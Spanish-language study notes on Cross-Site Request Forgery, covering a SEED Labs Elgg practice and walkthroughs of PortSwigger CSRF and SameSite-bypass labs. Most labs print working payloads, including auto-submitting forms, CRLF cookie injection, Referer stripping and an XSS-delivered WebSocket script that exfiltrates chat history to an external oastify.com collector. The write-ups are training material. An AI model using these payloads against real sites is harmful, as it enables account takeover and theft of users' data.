------
El **Cross-Site Request Forgery** (**CSRF**) es una vulnerabilidad de seguridad en la que un atacante **engaña** a un usuario legítimo para que realice una acción no deseada en un sitio web sin su conocimiento o consentimiento.

En un ataque CSRF, el atacante engaña a la víctima para que haga clic en un enlace malicioso o visite una página web maliciosa. Esta página maliciosa puede contener una solicitud HTTP que realiza una acción no deseada en el sitio web de la víctima.

Por ejemplo, imagina que un usuario ha iniciado sesión en su cuenta bancaria en línea y luego visita una página web maliciosa. La página maliciosa contiene un formulario que envía una solicitud HTTP al sitio web del banco para transferir fondos de la cuenta bancaria del usuario a la cuenta del atacante. Si el usuario hace clic en el botón de envío sin saber que está realizando una transferencia, el ataque CSRF habrá sido exitoso.

El ataque CSRF puede ser utilizado para realizar una amplia variedad de acciones no deseadas, incluyendo la transferencia de fondos, la modificación de la información de la cuenta, la eliminación de datos y mucho más.

Para prevenir los ataques CSRF, los desarrolladores de aplicaciones web deben implementar medidas de seguridad adecuadas, como la inclusión de tokens CSRF en los formularios y solicitudes HTTP. Estos tokens CSRF permiten que la aplicación web verifique que la solicitud proviene de un usuario legítimo y no de un atacante malintencionado (aunque cuidadín que también se pueden hacer cositas con esto).

Os compartimos a continuación el enlace al comprimido ZIP que utilizamos en esta clase para desplegar el laboratorio donde practicamos esta vulnerabilidad:

- **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)

## Notas de la Practica

En esta ocasión vamos a trabajar en una maquina donde nosotros ya tenemos credenciales validas:
```bash
alice:seedalice
samy:seedsamy
```

con esto en mente vamos a entrar con las credenciales de alice:
![[Pasted image 20250825191351.png]]

estamos en la cuenta de alice.

Lo primero que vamos a hacer es tratar de interceptar la petición cuando queremos cambiar al nombre para ver como se tramita esta petición:
![[Pasted image 20250825191652.png]]

vemos que tenemos allí los valores. y además tenemos `__elgg_token` y tenemos para cada uno como un identificados.

Para comenzar a testear el CSRF vamos a Cambiar a GET y en el repeater vamos a  ver si los campos son realmente necesarios:

![[Pasted image 20250825191942.png]]
ya la petición esta en GET y vamos a comenzar quitando los `__elg_token` y veamos si sin esto podemos cambiar el nombre:

![[Pasted image 20250825192055.png]]

![[Pasted image 20250825192115.png]]

vemos un 200ok lo que es buena señal y además si revisamos la web veríamos que efectivamente se cambio el nombre del usuario:

![[Pasted image 20250825192203.png]]

esto nos indica que esos dos valores en realidad no sirven para nada y esto ya nos da indicios de un posible CSRF.

Lo que podemos intentar es modificando el valor de identificador y tambien el nombre para cambiar el nombre a otro usuario, en este caso tratamos con Samy donde su `id=59` :

![[Pasted image 20250825192429.png]]

vemos que sale 200 ok pero si leemos un poco podremos observar que nos dice que no tenemos suficientes permisos y no se realizo el cambio.

Ahora si revisamos nosotros podemos enviar mensajes privados y en estos mensajes nosotros podemos insertar enviar un mensaje privado de la siguiente manera:

![[Pasted image 20250825192914.png]]

lo que hacemos es ver si los mensajes interpretan valores html.

![[Pasted image 20250825193104.png]]

vemos que el marquee no se interpreta pero el h1 si lo hacer por lo que el objetivo va a ser que mediante un mensaje cuando alice lo abra logremos cambiar el su nombre de perfil de stark a beater por ejemplo y esto lo hacemos de la siguiente manera:

![[Pasted image 20250825193356.png]]

si al enviar lo que va a pasar es que a alice al no poder cargar la imagen va a salir una como imagen rota representativa, si no lo queremos podemos hacer lo siguiente:
![[Pasted image 20250825193552.png]]

ya esto lo podemos probar y ver si es que funciono:

![[Pasted image 20250825193627.png]]

vemos que si se logro cambiar solo por el simple echo de no tener una seguridad robusta como serial si funcionaran los tokens.

De esta forma nosotros podemos cambiar cualquier cosa incluida la contraseña, aunque en esta web nos pide la contraseña antigua por lo que podemos validar si es necesario el campo de contraseña antigua para realizar el cambio:

![[Pasted image 20250825194005.png]]

como vemos ya capturamos la información y el proceso es el mismo por lo que procedemos a cambiar el método de POST a GET y a eliminar el campo de `current_password` para ver si en verdad es necesario:

![[Pasted image 20250825194217.png]]

vemos que no, no nos deja por lo que eso esta bien validado.

Pero el concepto es lo mismo para cualquier otro objetivo.


## PortSwigger

### Lab: CSRF vulnerability with no defenses

Vamos con el primer lab, el propósito es cambiar el correo de un usuario dentro de la web, en este caso para esto primero tenemos que saver como se esta produciendo la petición, para esto capturamos el momento en el cual se realiza el cambio:

![[Pasted image 20250911094446.png]]

Podemos ver que la petición se realiza a l web de `/my-account/change-emai` enviando el valor de email con el cuerpo de la petición.

Bueno, en este punto lo que vamos a hacer es que un usuario que ya se encuentra dentro con sus credenciales mediate una web vulnerable se envié por post los valores de un formulario y se auto envíe de forma automática, el formulario nosotros podemos sacarlo de la misma web:
![[Pasted image 20250911094839.png]]

lo sacamos, acomodamos y quitamos cosas demás que no son necesarias como el button y label y modificamos el valor de action para que se envíe a la url de forma estática por decirlo así, y vamos a agregar también etiquetas JavaScript que permiten el envío automático del formulario de la siguiente manera:

```html
<form class="login-form" name="change-email-form" action="https://0a9b008a03d8ec338143a2b400080084.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@hacked.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

tenemos la forma automática de enviar un formulario con JavaScript y es seleccionándolo y enviado. Como el laboratorio es de PortSwigger vamos a ver como queda en la parte de exploit:
![[Pasted image 20250911095725.png]]

Si lo esto lo enviamos vemos primero a ver si funciona, nuestro correo actual es `test@test.com`:
![[Pasted image 20250911095632.png]]
vemos que pasa:
![[Pasted image 20250911095748.png]]

Cambio por lo que en este punto podemos enviar el exploit para completar el lab:
![[Pasted image 20250911095854.png]]

Lab Terminado.


### Lab: CSRF where token validation depends on request method

En este lab vamos a ver como vulnerar cuando la validación del token depende del método de la petición.

Vamos a comenzar interceptando la petición cuando se intenta hacer el cambio de correo:
![[Pasted image 20250911101856.png]]
Vemos que en este este caso no solo se tramita el valor de correo sino un `csrf` que es un token de seguridad.

Algo que nosotros tenemos que intentar validar es primero si el campo es necesario, si lo quito y me deja pasar, en este caso si lo es, otra cosa común que suele suceder es que las peticiones se admiten también por otro método, en este caso si lo pasamos a `GET` vemos que sucede:

![[Pasted image 20250911103151.png]]

Vemos que si es valido recordemos que los códigos de estados `300` suelen asociarse a redirecciones mas no a errores por lo que podemos toarlo como correcto y saldrá correcto al darle a `follow redirection`
![[Pasted image 20250911103311.png]]

En este punto algo que podemos validar es otra vez si es necesario el campo de  `csrf` :

![[Pasted image 20250911103405.png]]
![[Pasted image 20250911103421.png]]

Se tramito sin problemas sin necesitar el campo de `csrf` por lo que con esto en mente tenémos que crear la web maliciosa de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0a9400f6046b1e2d81ce76d9001100de.web-security-academy.net/my-account/change-email" method="GET">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

Perfecto la estructura del login es de igual forma sacada de la web y cambiamos el `action` para apuntar exactamente a lo que queremos, además cambiamos el método para que se ejecute por `GET` con esto vamos a configurarlo en la pagina de exploit:

![[Pasted image 20250911104039.png]]

Y esto funciona por lo que veremos:
![[Pasted image 20250911104108.png]]
Lab Terminado.


### Lab: CSRF where token validation depends on token being present

En este lab solo se realizara la validación cuando tenemos presente un token, si no lo tiene la petición pasa:
![[Pasted image 20250911104547.png]]

vemos al igual que en el anterior la petición pero ahora vamos a volver a intentar el ver que pasa cuando eliminamos el parámetro de `csrf`:
![[Pasted image 20250911104701.png]]
Genial pues nos deja pasar, con esto en mente creemos el código de la web maliciosa:
```html
<form class="login-form" name="change-email-form"
  action="https://0af700c9046c20e798d940e500cd00a2.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="pwned@pwned.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

En el apartado de exploit se vería de la siguiente manera:
![[Pasted image 20250911105039.png]]

Enviamos y ya resolveríamos el laboratorio:
![[Pasted image 20250911105126.png]]

Lab Terminado.

### Lab: CSRF where token is not tied to user session

En este laboratorio ya se esta empleando el `csrf` de un solo uso, lo que ya no permite que atacantes puedan reutilizarlo para enviar otras peticiones mal intencionadas.

Ahora esto tiene que estar bien configurado y que los tokens generados sean asociados a las cuentas que los usan el por que es sencillo si nosotros logramos generar un `csrf` y no lo usamos queda activo, ahora si este no esta asociado a la cuenta que lo genero lo que sucede es que podemos usarlos en otras cuentas y este es el caso de esta maquina y el porque nos dan dos usuarios, vamos a sacar un `csrf` valido de la cuenta de `wiener` :

![[Pasted image 20250911111656.png]]

No dejamos que la petición se envíe, ahora vamos a con este token crear el archivo html malicioso que debería funcionar:
```html
<form class="login-form" name="change-email-form"
  action="https://0add00be0470395e81f7de0100c900a0.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="14GTTcgepngtpvz6R5Xq2o3TjQq24duq">
</form>

<script>
  document.forms[0].submit();
</script>
```

Ya tenemos listo el código con el token y el auto enviar además del token valido puesto, en el exploit se vería así:
![[Pasted image 20250911112217.png]]
enviemos, esto debería funcionar:

![[Pasted image 20250911112355.png]]
Lab Terminado.

### Lab: CSRF where token is tied to non-session cookie

Bueno al igual que en la anterior lab vamos a tener dos usuario con los cuales vamos a estar realizando las pruebas, en este caso vamos a tener uno en firefox y otro corriendo en el chromium de Brupsuite:
![[Pasted image 20250911121735.png]]
![[Pasted image 20250911121747.png]]

Bueno vamos a capturar la petición de igual forma de alguno de los dos al momento de cambiar el correo con esto podemos intentar ver como se tramita y que es lo que usa:
Wiener:
![[Pasted image 20250911122008.png]]
Carlos:
![[Pasted image 20250911122142.png]]

Perfecto vemos como se esta tramitando las peticiones en dos cuentas y esto ayuda en realidad mucho ya que vemos cosas como que el `csrf` cambia pero algo que llama la atención es que en el primero de wiener yo realize un búsqueda y luego intenta cambiar el nombre y al parecer arrastro un campo de search, a contrario de Carlos donde no realize búsquedas y podemos ver que efectivamente no se esta arrastrando nada.

Revisando y por medio de prueba determinamos que en este caso el `csrf` no es de un solo uso por lo que se puede reutilizar multiples veces para cambiar los emails. No podemos eliminar los campos y tampoco realizar cambio de método, los dos `csrf` son validados y necesarios. Se uso un `csrf` en el otro usuario y vimos que no es valido, puede que ya tengan algún tipo de vinculo con la cuenta, esto si solo cambiamos uno de los dos pero si usamos el `csrf y csrfkey`  de Carlos en wiener funciona por lo que me llama la atención de que los dos campos tienen algún vinculo al ser verificados:

![[Pasted image 20250911123108.png]]

Analicemos, el `csrf` tramitado en el formulario nosotros lo podemos pasar sin ningún problema y poner un valido que sea el nuestro mismo, pero el `csrfKey` que se almacena en la Cookie es diferente y también necesitamos cambiarla, pero para esto necesitamos alguna forma de hacerlo.

En este punto tenemos algo fundamental y es el como se están tramitando las búsquedas, vamos a capturar una y ver mas a detalle como se están tramitando:
![[Pasted image 20250911123707.png]]
Vemos algo no usual y es que se usa un campo en la cookie llamado `lastSearchTerm` con el valor que le pasamos en la búsqueda, además en la respuesta vemos en `set-cookie` vemos lo mismo, lo que hace el `set-cookie` es que deja por decirlo de alguna manera establecida esa cookie con su valor para una futura búsqueda, ahora lo que vamos a verificar es si ese campo es inyectable, donde yo pueda insertar ciertos comandos:
![[Pasted image 20250911124418.png]]
Perfecto, podemos observar que si tenemos posibilidad de inyectar datos:
![[Pasted image 20250911124945.png]]
vemos que si podemos pero el echo de que no tome los colores es algo preocupante por lo que vamos a intentar modificar de esta manera una petición nuevo y luego ver su respueta:

![[Pasted image 20250911125108.png]]
![[Pasted image 20250911125303.png]]
perfecto, ahora intentemos ver una nueva solicitud a ver que nos esta arrastrando:
![[Pasted image 20250911125343.png]]
vemos que no se cambio el valor de `csrfKey` esto ya me indica que no se esta interpretando la inyección.

Algo mas que podemos intentar es ver si podemos inyectar otro parámetro del mismo estilo `set-cookie`:
![[Pasted image 20250911125628.png]]
Logramos inyectar otro Set-Cookie pero necesitamos obligatoriamente hacer un salto de línea para que se interprete, nosotros podríamos tratar de hacer es revisar el manual de ASCII y determinar como se puede insertar un enter `\r` y una nueva línea `\n`:
![[Pasted image 20250911125939.png]]

Perfecto podemos, ayudarnos del decoder de BurpSuite para ver como va quedando nuestra cadena de la siguiente manera:
![[Pasted image 20250911130056.png]]
Vemos que esta bastante bien podemos intentar con esto a ver que logramos:
![[Pasted image 20250911130155.png]]
Es de locos y esto funciona, ahora podemos ver que los colores dan a entender que si se esta interpretando así que podemos intentar esto igual que antes y ver si en nuevas peticiones logramos un cambio:
![[Pasted image 20250911130416.png]]
veamos en una nueva petición:
![[Pasted image 20250911130450.png]]
Lo cambiamos, ya con esto estamos echos, ahora lo que vamos a intentar es crear una estructura en html con la cual primero vamos a cargar una búsqueda en la web para primero cambiar el `csrfKey` y luego de esto enviar el formulario, entonces vamos a aplicar algo de conocimientos para esta ocasión.

Veamos como nos queda el código y lo explicamos luego:
```html
<form class="login-form" name="change-email-form"
  action="https://0ae90019046635d9819feded0086004b.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@Hacked">
  <input required="" type="hidden" name="csrf" value="KvvdkmMiwPqmbwg8SdLwOLiWXy4PyYRp">
</form>

<img
  src="https://0ae90019046635d9819feded0086004b.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrfKey=uz34HoR5Mk1fFn8fEu9IvbgqC7I9de3H;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

Vamos a ver primero configuramos el formulario con el link y la `csrf` correspondiente, ahora, el formulario a un no se envía solo se define lo primero que intentara cargarse es la imagen la cual contiene el link con la petición maliciosa al buscador donde se cambiara el valor de `csrfKey` para que concuerde con el `csrf` del formulario y pueda ejecutarse, tambien se implemento lo de `SameSite=None` el cual es un parámetro que nos permite enviar la cookies entre sitios web es muy importante ya que como lo nuestro es un sitio web malicioso es necesario que se active en la victima para que las cookies que envío desde mi web se insertarse, por ultimo el error que producirla la etiqueta `img` al no podemos cargar una imagen y lo controlamos para que al provocarse envíe el formulario.

Veamos en el exploit para ver como nos queda:
![[Pasted image 20250911134449.png]]
Ahora si veamos si funciona:
![[Pasted image 20250911134500.png]]
Lab Terminado.

### # CSRF con token duplicado en cookie

Al parecer tenemos el token duplicado en la cookie por lo que entiendo y esto seguridad en si no tiene pero vamos a ver como es que esta echo para comprenderlo mejor:

![[Pasted image 20250911135402.png]]
Vemos que tenemos el token duplicado y esto seguridad no tiene por ningún lado, seria transportar el mismo concepto de el Lap anterior y modificar los dos campos.
![[Pasted image 20250911135501.png]]
Revisando un poco vemos que no se verifica que sea un token valido sino que solo se verifica si los dos son iguales por lo tanto esto es muy malo así que vamos a crear algo similar a lo anterior viendo si de alguna manera search tiene la misma vuln.

![[Pasted image 20250911135800.png]]
Vemos que si es lo mismo y solo vamos a modificar un poco el código quedando de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
  <input required="" type="hidden" name="csrf" value="hacked">
</form>

<img
  src="https://0ae6003c04fa057880f7032a009b003a.web-security-academy.net/?search=Hola;%20%0d%0aSet-Cookie:%20csrf=hacked;%20SameSite=None"
  onerror="document.forms[0].submit();">
```

Como vemos es el mismo concepto anterior con el cambio de que puedo poner cualquier cosa en el `csrf y csrfKey` siempre y cuando sean iguales vemos en exploit:
![[Pasted image 20250911140703.png]]

Vemos si funciona:
![[Pasted image 20250911140724.png]]

Lab Terminado.

### Lab: SameSite Lax bypass via method override

Esta maquina es bastante sencilla el objetivo por decirlo de alguna forma es tramitar una petición por GET y forzar a esta misma para que se presente como POST, es algo extraño encontrar esto en las webs ya que depende mucho de la lógica que se este implementando por detras en la web pero puede ser util:
![[Pasted image 20250911160958.png]]
Ahora esa petición vamos a pasarla a GET:
![[Pasted image 20250911161026.png]]
Así tal cual como vemos no funciona pero concatenando el parámetro `_method=POST` pude funcionar:
![[Pasted image 20250911161157.png]]

tomando esto en cuenta para resolver solo vamos a crear una web que apunte tal y como lo tenemos en el BurpSuite y deveria funcionar, el código es el siguiente:
```html
<script>
  location = "https://0a0d00e804c10b71808d0d2900ed00c9.web-security-academy.net/my-account/change-email?email=Hacker%40hack.com&_method=POST";
</script>
```

![[Pasted image 20250911161513.png]]Listo:
![[Pasted image 20250911161529.png]]
Lab Terminado.


### Lab: SameSite Strict bypass via client-side redirect

Al igual que en los otros laboratorios el objetivo es cambiar el correo Electrónico y para esto como siempre vamos a capturar como ese efectúa la petición para este cambio:

![[Pasted image 20250911161939.png]]

Vemos como se tramitan las peticiones y es que no tenemos un `csrf`, intentemos tramitar la petición por get a ver si se puede hacer:
![[Pasted image 20250911162322.png]]
Perfecto si podemos hacerlo, en este punto podemos crear la web maliciosa e intentar solo con un script llamar a la web y ver si se resuelve:

![[Pasted image 20250911162449.png]]
En este punto vemos si se resuelve el lab:
![[Pasted image 20250911162522.png]]
Pues no no se resuelve y puede que algo raro esta pasando vamos a ver como se tramita el exploit para entender:
![[Pasted image 20250911163304.png]]
Primero vemos que en la petición no estamos arrastrando cookies y lo que nos llama la atención es que tiene el `SameSite=Strict` el cual no permite el arrastrar arrastrar las cookies.

Entonces lo que tenemos que hacer es que toda la inyección tiene que darse en la misma página por lo que tenemos que burlar el `SameSite=Strict` para esto vamos a buscar algo que nos permita cargar la web desde su mismo origen.

Revisando la web me encontré que al realizar una publicación de un post solito se redirige al mismo si darle a regresar luego de unos segundos, revisando el historial me encontré con la siguiente petición:
![[Pasted image 20250911165422.png]]
Esta es la web para confirmar que se subió y regresar pero la misma luego de unos segundos realiza otra petición que seria la siguiente:
![[Pasted image 20250911165539.png]]
En este vemos que se llama a un script el cual por como esta construido tenemos el parámetro `postId` que lo usamos en la petición anterior, esto nos redirige a `blogPath` que como nos redirige en la pagina original a la ruta completa y  `/post/` era `la ruta/post/` y por ultimo inserta el valor de `postId` lo que podemos intentar ver es si el valor puede ser el que queramos:
![[Pasted image 20250911165925.png]]

y vemos que al redirigirnos hace:
![[Pasted image 20250911165947.png]]
Si nos redirige, aunque no encuentra el test nos permite redirigir.

En este punto lo que podemos hacer es ver si en la parte exacta del `test` le podemos hacer `../my-account` y ver si nos redirige:
![[Pasted image 20250911170228.png]]
![[Pasted image 20250911170241.png]]
Por como no nos saca de la cuenta podemos ver que si nos arrastra la cookie, entonces en este punto lo que podemos hacer es en ese punto inyectar la url para cambio de correo de la siguiente manera:

![[Pasted image 20250911170548.png]]
Esta muy bien pero aun no nos va a funcionar ya que cosas como el segundo `?` y el `&` nos van a dar problemas así que vamos a url encode y vemos como nos queda:
![[Pasted image 20250911170748.png]]
Vemos si ahora funciona:
![[Pasted image 20250911170818.png]]
Lab Terminado.

### Lab: SameSite Strict bypass via sibling domain

En este laboratorio al parecer el objetivo es conseguir credenciales validas, vamos a ver que tenemos en la web:

![[Pasted image 20250911173502.png]]
![[Pasted image 20250911173623.png]]
escribimos en el chat y nos responde lo que parece texto predefinido, en este punto lo que vamos a hacer es ver como se esta tramitando el chat:
![[Pasted image 20250911174328.png]]
Vemos que bajo el `/chat` se realiza la petición pero luego de esta petición lo que tenemos otro recurso js que se emite:
![[Pasted image 20250911174815.png]]

Miramos que en esta petición tenemos un `access-control-allow-origin` el cual carga un dominio diferentes, vamos a revisar que es eso:
![[Pasted image 20250911175008.png]]

Perfecto tenemos un dominio aparte el cual cumple con el mismo origen, es verdad que el subdominio no es el mismo pero el origen si por lo que si logramos de alguna forma desde este realizar un redirect debería por concepto arrastrarse la cookie. 

Bueno por ahora lo primero que quiero intentar es ver si puedo obtener información del chat, se están empleando WebSocket por lo que vamos a revisar el historial de WebSocket a ver como se tramita:
![[Pasted image 20250911182109.png]]

Vemos que lo primero que se tramita es un `READY` y luego de esto comenzamos con los mensajes del chat, Con esto claro vamos a crear un pequeño script primero para intentar obtener los mensajes del chat, de la siguiente manera:
```html
<script>
  var ws = new WebSocket("/chat");
  ws.onopen = function () {
    ws.send("READY");
  };

  ws.onmessage = function (info) {
    fetch("https://4y36xndfgjd3wp5d7jxd5afnler5fv3k.oastify.com/?data=" + btoa(info.data));
  };
</script>
```

Perfecto en este script jugamos con WebSocket para generar una conexión y como vimos que al comenzar envía un `READY` parase ser el que inicia el chat luego vamos guardar lo que nos responda y lo vamos a enviara en base64 utilizando lo que es el collaborator de BurpSuite, vemos como se ve en el exploit y si esto funciona:
![[Pasted image 20250911194809.png]]

![[Pasted image 20250911195012.png]]

Perfecto si nos llego al collaborator la cadena en base64 así que vamos a ver que es lo que contiene:
![[Pasted image 20250911195211.png]]

Bueno estamos viendo como si abrimos un nuevo chat esto es debido a que estamos cargando desde un servidor ajeno o tercero lo que sucede es que por el `SameSite=strict` no nos arrastra la cookie de session.

Entonces en este punto tenemos que buscar una forma de acontecer esto desde el mismo origen para que funcione.

Regresemos a la web de login que encontramos con anterioridad:
![[Pasted image 20250911195711.png]]

Vemos que se refleja lo que escribo, intentemos inyecciones XSS:
![[Pasted image 20250911195749.png]]
si nos interpreta el código, en este punto vamos a intentar ejecutar nuestro script anterior dentro del username a ver que sucede:
![[Pasted image 20250911195910.png]]
![[Pasted image 20250911200219.png]]
Perfecto si nos llego la información nuevamente de toda las conversaciones, es posible que ya nos este arrastrando las conversaciones vamos a crear un archivo con toda la información y a intentar pasar de base64 a normal para ver si es parte de la conversación:

![[Pasted image 20250911200514.png]]

Tenemos el chat, perfecto si funciona.

Perfecto ahora con esto claro vamos a interceptar la petición para ver como se esta tramitando:
![[Pasted image 20250911201816.png]]
Vemos que cambiando el método a GET también se envía aunque no funciona del todo ya que no me llega nada en el collaborator, en este punto vamos a intentar desde el navegador a ver que ocurre:
![[Pasted image 20250911202109.png]]
![[Pasted image 20250911202035.png]]

Perfecto también esta llegando la información. En este punto podemos armar de esa forma una petición para nuestra pagina maliciosa quedando:
```html
<script>
  location = "https://cms-0a33003004623d1c801f039100240050.web-security-academy.net/login?username=%3Cscript%3E+++var+ws+%3D+new+WebSocket(%22https%3A%2F%2F0a33003004623d1c801f039100240050.web-security-academy.net%2Fchat%22)%3B+++ws.onopen+%3D+function+()+{+++++ws.send(%22READY%22)%3B+++}%3B++++ws.onmessage+%3D+function+(info)+{+++++fetch(%22https%3A%2F%2Fx1zz0gg8jcgwzi86ac0683igo7uyis6h.oastify.com%2F%3Fdata%3D%22+%2B+btoa(info.data))%3B+++}%3B+%3C%2Fscript%3E&password=112341234"
</script>
```

![[Pasted image 20250911202234.png]]
Enviemos y vemos si obtenemos algo:
![[Pasted image 20250911202307.png]]
Perfecto nos acaba de llegar la información vamos a copiar todo lo que tengamos a un archivo ya ver que contiene esa conversación:
![[Pasted image 20250911202530.png]]
Listo, al parecer tenemos un usuario `carlos` y una contraseña:
![[Pasted image 20250911202645.png]]
Listo Lab Terminado.


### Lab: SameSite Lax bypass via cookie refresh

En este caso tenemos la configuración del `SameSite` pasa a ser lax la cual nos permite enviar la solicitudes desde el mismo sitio y en la solicitudes de otros sitios solo mediante el método `GET`.
En este caso el volvemos al cambio de email el cual es vulnerable, además esta lab tiene login basado en `OAuth` el cual es un estándar diseñado para permitir que un sitio web o una aplicación accedan a recursos alojados por otras aplicaciones web, para captarlo mas fácil es como cuando damos permisos para iniciar sesión mediante google en otra web.

Bueno veamos como esta esto aplicado:

![[Pasted image 20250911213948.png]]

obtengamos las solicitudes que se realizaron al iniciar sesión:

el flujo del programa es el siguiente, este no envía para hacer el login y una vez que lo hacemos nos redirige a una web que nos pide confirmación y nos manda al home, ahora en este proceso lo significativo es cuando se aplica el `OAuth` que es justo el momento luego de hacer login, lo que sucede es que la web nos asigna una cookie temporal con la cual nos manejamos fuera del sistema, pero al iniciar sesión se genera la petición del `OAuth` el cual permite asignar la nueva cookie de sesión generada:
![[Pasted image 20250911215652.png]]
Como vemos en la imagen en la respuesta vemos el `set-cookie` y la nueva cookie de la que hacemos uso, ahora si revisamos esta cookie no lleva seguridad, lo que quiere decir que en este punto exacto nosotros comenzamos a arrastrar la cookie, el objetivo es cambiar el email de algún usuario y es completamente vulnerable el campo del email entonces lo primero que intentamos es un cambio común:
```html
<form class="login-form" name="change-email-form"
  action="https://0a5600af03a720c480fc4415003000b5.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
</form>


<script>
  document.forms[0].submit();
</script>
```

 si usamos esto y lo enviamos vamos a ver que no funciona. En ese caso la mentalidad es la siguiente, si no funciona puede ser que el usuario no esta con la sesión activa lo que quiere decir que no esta con la cookie necesaria para funcionar, como solucionamos esto?
Aquí entra en juego la petición la cual incrusta la nueva cookie y es que si el usuario ya tenia una sesión iniciada vamos a encargarnos de primero cargar la web del `OAuth` y esperar un momento, esto para que la cookie sea correcta y luego de eso provocamos que cargue el formulario y lo hacemos de la siguiente manera:
```html
<form class="login-form" name="change-email-form"
  action="https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hacked.com">
</form>


<script>
  window.open("https://0a7b00860326e8e2800203d5000100f4.web-security-academy.net/social-login");
  setTimeout(onload, 5000);
  function onload() {
    document.forms[0].submit();
  }
</script>
```

En este caso lo primero que hacemos es con `widow.open` cargar la web tratando de que se genere la nueva cookie, luego esperamos 5 segundos y llamamos a la función `onload` que enviara el formulario, vemos si funciona:
![[Pasted image 20250911221254.png]]

![[Pasted image 20250911221309.png]]
Lab Terminado.


### Lab: CSRF where Referer validation depends on header being present

El objetivo no cambia es el mismo, cambiar el email de algún usuario.

Cuando nos habla de Referer es el nombre de un campo de cabecera del HTTP opcional que identifica la dirección de la página web desde la que se realiza la solicitud. Mediante un chequeo de este campo el servidor del nuevo sitio puede determinar de donde se originó la solicitud.

Bueno lo primero que vamos a hacer es ver como se tramita la petición para el cambio de email:
![[Pasted image 20250911222054.png]]

No vemos ninguna seguridad dura de las que hemos tocado ni nada a mas del Referer, algo que suele emplearse es que se compara el Referer para ver si la solicitud se esta tramitando por el mismo origen, intentamos ya recrear el formulario y enviarlo a ver si funciona:
```html
<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911222414.png]]

![[Pasted image 20250911222430.png]]
Vemos que no funciona, esto me da a entender que esta verificando la cabecera Referer.

Si capturamos la petición del exploit veremos lo siguiente:
![[Pasted image 20250911222617.png]]

como podemos observar el Referer si esta cambiando ya que se esta ejecutando con uno diferente lo que esta causando el conflicto.

Ahora que tenemos la solicitud y si borramos la cabecera, esto se sigue validando?:
![[Pasted image 20250911222751.png]]
Pues no si la eliminamos nos permite paso al cambio sin ningún problema.

Entonces nuestro objetivo es quitar la cabecera Referer pero desde el exploit, esto lo vamos a intentar de la siguiente manera con ayuda de etiquetas `meta`:
```html
<html>

<head>
  <meta name="referrer" content="no-referrer">
</head>

<form class="login-form" name="change-email-form"
  action="https://0ada0062036c757c81c6b13100940028.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="prueba@prueta.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```
No todas pero algunas cabeceras son manipulables desde el html como la de Referrer, recordemos que esta cabecera por definición en html es `Referrer` y ortográficamente también es así pero por un error ortográfico mismo en las cabeceras cuando se tramita lo hace como Referer.

Bueno ahora vemos si podemos completar el lab con esto:

![[Pasted image 20250911223657.png]]
![[Pasted image 20250911223643.png]]
Lab Terminado.


### Lab: CSRF with broken Referer validation

En este ultimo laboratorio el objetivo es el mismo cambiar el correo electrónico donde seguimos haciendo uso del concepto del Referer.

Vamos a capturar como de costumbre la petición para el cambio de email a ver que nos encontramos:
![[Pasted image 20250911224205.png]]

No vemos que se emplea algún token por lo que de una creamos el envío del formulario automático a ver que logramos:
```html
<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>
```

![[Pasted image 20250911224606.png]]

Lo probamos y vemos lo siguiente:
![[Pasted image 20250911224629.png]]

Podemos intentar lo mismo que en el anterior eliminando el campo referrer pero no va a funcionar en esta ocasión.

Capturemos la solicitud y vamos a intentar algunas cosas:
![[Pasted image 20250911224859.png]]
como ya se intento si eliminamos el Referer no vamos a lograr pasar por lo que en este punto lo que podemos intentar es ver como se esta validando esa cabecera.

Podemos intentar primero eliminando caracteres:
![[Pasted image 20250911225103.png]]
vemos que no, ahora intentamos agregar información:
![[Pasted image 20250911225136.png]]
Excelente al parecer nosotros podemos agregar información como deseemos ya que por decir solo busca que en la cadena exista el patron con el que se compara que es el domino exacto, entonces nosotros podemos agregar a esto lo que queramos, podemos intentar el cambiar el nombre del archivo por el dominio, esto por lógica debería funcionar, pero no lo va a hacer debido a las políticas del Referrer y para solucionarlo vamos a usar una que es la `unsafe-url` esta política permite que en el Referer se incruste toda la url por completo incluido los parámetros y todo lo que este después del domino dado.

con eso en cuenta nuestro script va a quedar de la siguiente manera:
```html
<html>

<head>
  <meta name="referrer" content="unsafe-url">
</head>

<form class="login-form" name="change-email-form"
  action="https://0a58003b04842cc682bd113f003700d9.web-security-academy.net/my-account/change-email" method="POST">
  <input required="" type="email" name="email" value="Hacked@hack.com">
</form>

<script>
  document.forms[0].submit();
</script>

</html>
```
![[Pasted image 20250911230025.png]]

![[Pasted image 20250911230119.png]]
Lab Terminado.